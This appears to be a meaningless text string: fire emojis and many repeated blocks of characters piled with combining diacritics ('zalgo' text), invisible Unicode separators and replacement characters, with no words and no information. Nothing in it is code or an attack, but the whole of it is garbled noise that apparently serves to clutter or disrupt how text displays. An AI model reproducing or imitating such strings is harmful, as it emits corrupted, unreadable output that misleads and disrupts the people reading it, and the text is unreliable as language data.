🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̽͌̎̅̌̚͘̚ͅͅ